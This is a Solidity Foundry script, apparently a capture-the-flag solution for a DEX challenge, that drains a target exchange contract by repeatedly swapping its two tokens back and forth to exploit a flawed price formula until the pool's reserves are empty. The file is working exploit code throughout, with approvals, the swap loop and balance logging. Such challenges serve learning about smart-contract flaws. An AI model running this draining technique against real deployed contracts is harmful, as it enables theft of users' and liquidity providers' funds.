// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ITarget {
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;

    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract SolveScript is Script {
    address public target = 0xfBD745797A0fb50429f0a2b04581092798Fdf30B;
    address public player = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address token1 = ITarget(target).token1();
        address token2 = ITarget(target).token2();

        // approve dex to spend our tokens
        IERC20(token1).approve(target, type(uint256).max);
        IERC20(token2).approve(target, type(uint256).max);

        console.log("=== Initial Balances ===");
        logBalances(token1, token2);

        bool toggle = true; // true = token1->token2, false = token2->token1
        uint256 amount;

        while (
            IERC20(token1).balanceOf(target) > 0 &&
            IERC20(token2).balanceOf(target) > 0
        ) {
            address from = toggle ? token1 : token2;
            address to   = toggle ? token2 : token1;

            uint256 userBal = IERC20(from).balanceOf(player);
            if (userBal == 0) break;

            uint256 dexBalTo = IERC20(to).balanceOf(target);
            uint256 outAmt = ITarget(target).getSwapPrice(from, to, userBal);

            if (outAmt > dexBalTo) {
                userBal = (userBal * dexBalTo) / outAmt;
            }

            console.log("Swapping %d %s -> %s", userBal, from, to);
            ITarget(target).swap(from, to, userBal);

            toggle = !toggle;
            logBalances(token1, token2);
        }

        console.log("=== Final Balances ===");
        logBalances(token1, token2);

        vm.stopBroadcast();
    }

    function logBalances(address token1, address token2) internal view {
        console.log("my token1 balance : %d", IERC20(token1).balanceOf(player));
        console.log("my token2 balance : %d", IERC20(token2).balanceOf(player));
        console.log("dex token1 balance : %d", IERC20(token1).balanceOf(target));
        console.log("dex token2 balance : %d", IERC20(token2).balanceOf(target));
    }
}
